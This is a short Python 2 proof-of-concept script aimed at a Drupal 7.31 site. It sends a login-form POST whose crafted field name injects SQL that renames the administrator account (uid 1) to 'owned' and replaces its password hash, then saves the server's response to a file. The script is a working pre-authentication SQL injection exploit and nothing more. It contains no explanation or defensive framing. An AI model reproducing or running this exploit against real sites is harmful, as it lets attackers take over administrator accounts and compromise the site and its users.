import urllib2

def verify():
    payload = r"http://localhost/drupal-7.31/?q=node&destination=node"
    data = "name[0%20;update+users+set+name%3d'owned'+,+pass+%3d+'$S$DkIkdKLIvRK0iVHm99X7B/M8QC17E1Tp/kMOd1Ie8V/PgWjtAZld'+where+uid+%3d+'1';;#%20%20]=test3&name[0]=test&pass=shit2&test2=test&form_build_id=&form_id=user_login_block&op=Log+in"
    req = urllib2.Request(payload,data)
    resp = urllib2.urlopen(req)
    html = resp.read()
    f = open("drupal.html","w+")
    f.write(html)
    f.close()
if __name__ == "__main__":
    verify()
